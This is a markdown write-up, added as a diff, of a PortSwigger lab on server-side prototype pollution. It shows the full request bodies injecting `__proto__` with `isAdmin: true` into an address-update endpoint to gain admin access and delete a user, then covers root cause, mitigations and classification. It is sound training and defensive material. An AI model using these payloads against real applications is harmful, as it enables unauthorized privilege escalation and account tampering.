@@ -1,0 +1,516 @@
+# PortSwigger Web Security Academy
+
+# Server-side prototype pollution via `__proto__` with `isAdmin` gadget
+
+## Objective
+
+The objective of this lab was to identify and exploit a **server-side prototype pollution** vulnerability in the account address update functionality.
+
+The application accepts user-controlled JSON data through the `/my-account/change-address` endpoint. By injecting the `__proto__` property, it is possible to pollute the server-side object prototype.
+
+The polluted `isAdmin` property is subsequently inherited by the user object and trusted by the application for authorization decisions, resulting in **privilege escalation** and unauthorized access to the administrator panel.
+
+The final objective was to gain administrative access and delete the user `carlos`.
+
+---
+
+# Technologies involved
+
+* Burp Suite Community Edition
+* Burp Repeater
+* HTTP/2
+* JSON
+* JavaScript / Node.js
+* Express
+* Server-Side Prototype Pollution
+
+---
+
+# Reconnaissance
+
+After authenticating as the `wiener` user, the account page was accessed and the billing/delivery address was updated.
+
+The corresponding request was identified in:
+
+**Burp Suite → Proxy → HTTP history**
+
+The application submitted the address information as JSON through:
+
+```http
+POST /my-account/change-address HTTP/2
+```
+
+The original request body was:
+
+```json
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "oz0TVbtSI8RcYE8b3RHCppy9XGcIo0q4"
+}
+```
+
+The request was sent to Burp Repeater for further testing.
+
+The server returned a JSON representation of the authenticated user, including an `isAdmin` property:
+
+```json
+{
+  "username": "wiener",
+  "firstname": "Peter",
+  "lastname": "Wiener",
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "isAdmin": false
+}
+```
+
+The presence of the `isAdmin` property was particularly interesting because it could potentially represent an authorization-related gadget.
+
+---
+
+# Identification
+
+## Testing for Prototype Pollution
+
+To determine whether the JSON parser or object-merging functionality was vulnerable to prototype pollution, an additional `__proto__` property was added to the request:
+
+```json
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "oz0TVbtSI8RcYE8b3RHCppy9XGcIo0q4",
+  "__proto__": {
+    "foo": "bar"
+  }
+}
+```
+
+The request returned an HTTP `200 OK` response.
+
+The response contained:
+
+```json
+"foo": "bar"
+```
+
+while no explicit `__proto__` property was present.
+
+The relevant response was:
+
+```json
+{
+  "username": "wiener",
+  "firstname": "Peter",
+  "lastname": "Wiener",
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "isAdmin": false,
+  "foo": "bar"
+}
+```
+
+This behavior strongly indicated that the injected property had been added to the object's prototype rather than being stored as a normal own property.
+
+Conceptually, the application behavior can be represented as:
+
+```text
+Attacker-controlled JSON
+        |
+        v
+     __proto__
+        |
+        v
+Prototype pollution
+        |
+        v
+Object.prototype.foo = "bar"
+        |
+        v
+User object inherits foo
+```
+
+This confirmed the presence of a **server-side prototype pollution source**.
+
+---
+
+# Identification of the Gadget
+
+The response contained an existing authorization-related property:
+
+```json
+"isAdmin": false
+```
+
+This was identified as a potential prototype pollution gadget.
+
+If the application does not define `isAdmin` as an own property of the user object and instead relies on property lookup through the prototype chain, polluting the prototype with:
+
+```javascript
+isAdmin = true
+```
+
+could cause the authorization check to evaluate to `true`.
+
+---
+
+# Exploitation
+
+## Polluting `isAdmin`
+
+The previous `foo` payload was replaced with:
+
+```json
+"__proto__": {
+    "isAdmin": true
+}
+```
+
+The complete malicious request was:
+
+```json
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "oz0TVbtSI8RcYE8b3RHCppy9XGcIo0q4",
+  "__proto__": {
+    "isAdmin": true
+  }
+}
+```
+
+The server returned:
+
+```http
+HTTP/2 200 OK
+```
+
+with the following relevant response:
+
+```json
+{
+  "username": "wiener",
+  "firstname": "Peter",
+  "lastname": "Wiener",
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "isAdmin": true,
+  "foo": "bar"
+}
+```
+
+The original value was:
+
+```json
+"isAdmin": false
+```
+
+After prototype pollution, it became:
+
+```json
+"isAdmin": true
+```
+
+This demonstrated that the polluted property was affecting the application's user object.
+
+---
+
+# Privilege Escalation
+
+After sending the malicious request, the account page was refreshed.
+
+An **Admin Panel** link became available to the authenticated `wiener` user.
+
+This confirmed that the polluted `isAdmin` property was being used by the application's authorization logic.
+
+The resulting attack chain was:
+
+```text
+POST /my-account/change-address
+             |
+             v
+        __proto__
+             |
+             v
+Object.prototype.isAdmin = true
+             |
+             v
+      user.isAdmin
+             |
+             v
+    Authorization check
+             |
+             v
+       Admin Panel
+             |
+             v
+    Privilege Escalation
+```
+
+The administrator panel was accessed and the `carlos` user was deleted.
+
+The lab was then successfully solved.
+
+---
+
+# Evidence
+
+### Original request
+
+```http
+POST /my-account/change-address HTTP/2
+```
+
+with the normal JSON body:
+
+```json
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "oz0TVbtSI8RcYE8b3RHCppy9XGcIo0q4"
+}
+```
+
+### Prototype pollution proof
+
+Payload:
+
+```json
+"__proto__": {
+    "foo": "bar"
+}
+```
+
+Result:
+
+```json
+"foo": "bar"
+```
+
+The injected property appeared in the response without an explicit `__proto__` property.
+
+### Authorization gadget
+
+Payload:
+
+```json
+"__proto__": {
+    "isAdmin": true
+}
+```
+
+Result:
+
+```json
+"isAdmin": true
+```
+
+The application subsequently exposed the administrator panel to the `wiener` account.
+
+### Final impact
+
+The attacker obtained unauthorized administrative access and was able to delete the `carlos` user.
+
+---
+
+# Root Cause
+
+The root cause is unsafe handling of attacker-controlled JSON properties.
+
+The application processes the `__proto__` property in a way that allows attacker-controlled properties to affect an object's prototype.
+
+Because JavaScript property lookup traverses the prototype chain, properties added to a prototype can become accessible through otherwise unrelated objects.
+
+The application then relies on the `isAdmin` property for authorization without ensuring that the value is an explicitly defined, trusted property belonging to the authenticated user.
+
+Conceptually:
+
+```javascript
+user.isAdmin
+```
+
+can resolve to a polluted prototype property:
+
+```javascript
+Object.prototype.isAdmin = true;
+```
+
+Instead of safely relying on trusted authorization state, the application therefore accepts attacker-controlled inherited properties.
+
+---
+
+# Impact
+
+The vulnerability allows an attacker to manipulate application behavior through server-side prototype pollution.
+
+In this case, the impact is particularly severe because the polluted property is related to authorization.
+
+Potential impact includes:
+
+* Privilege escalation
+* Unauthorized administrative access
+* Authentication or authorization bypass
+* Manipulation of application logic
+* Potential modification of other security-sensitive properties
+* Denial of service depending on available gadgets
+* Potential Remote Code Execution in applications containing suitable dangerous gadgets
+
+For this specific application, the demonstrated impact was:
+
+**Server-Side Prototype Pollution → Privilege Escalation → Administrative Access**
+
+---
+
+# Mitigations
+
+## 1. Reject dangerous prototype-related properties
+
+The application should reject user-controlled properties such as:
+
+```text
+__proto__
+constructor
+prototype
+```
+
+when they are not explicitly required by the application.
+
+---
+
+## 2. Use safe object handling
+
+Avoid unsafe recursive merges or object assignment patterns that allow prototype manipulation.
+
+Where appropriate, use objects without a prototype:
+
+```javascript
+Object.create(null)
+```
+
+for dictionaries containing untrusted keys.
+
+---
+
+## 3. Validate input against an allowlist
+
+Instead of accepting arbitrary JSON properties, explicitly define the fields that the endpoint accepts:
+
+```text
+address_line_1
+address_line_2
+city
+postcode
+country
+sessionId
+```
+
+Unexpected properties should be rejected.
+
+---
+
+## 4. Do not rely on inherited properties for authorization
+
+Authorization decisions should use trusted application state and should not depend on potentially inherited properties.
+
+For example, security-sensitive authorization values should be explicitly validated and associated with the authenticated user.
+
+---
+
+## 5. Implement authorization server-side
+
+Administrative privileges should be verified using a trusted authorization mechanism rather than relying on a mutable object property that may be influenced through user-controlled input.
+
+---
+
+## 6. Perform security testing for prototype pollution gadgets
+
+Applications using Node.js should be assessed not only for the presence of prototype pollution but also for exploitable gadgets.
+
+Testing should follow the chain:
+
+```text
+Source → Pollution → Gadget → Impact
+```
+
+---
+
+# Classifications
+
+### CWE
+
+**CWE-1321 — Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')**
+
+### OWASP Top 10
+
+**A03:2021 — Injection**
+
+Prototype pollution can be categorized under injection because attacker-controlled input is used to alter application object behavior and subsequently influence security-sensitive operations.
+
+### Vulnerability Type
+
+**Server-Side Prototype Pollution**
+
+### Impact Category
+
+**Broken Access Control / Privilege Escalation**
+
+---
+
+# Conclusions
+
+The application was vulnerable to **Server-Side Prototype Pollution** through the `__proto__` property accepted by the `/my-account/change-address` endpoint.
+
+The vulnerability was initially confirmed by injecting an arbitrary `foo` property and observing that it appeared in the returned user object without being explicitly defined.
+
+Further investigation identified `isAdmin` as a security-sensitive gadget. By injecting:
+
+```json
+"__proto__": {
+    "isAdmin": true
+}
+```
+
+the attacker was able to influence the value resolved by the application's authorization logic.
+
+This resulted in unauthorized access to the administrator panel and allowed the attacker to delete the `carlos` user.
+
+The vulnerability therefore demonstrates the complete exploitation chain:
+
+```text
+Attacker-Controlled JSON
+        ↓
+    __proto__
+        ↓
+Prototype Pollution
+        ↓
+   isAdmin = true
+        ↓
+Authorization Bypass
+        ↓
+Privilege Escalation
+        ↓
+Administrative Access
+```
+
+The lab was successfully exploited and solved.
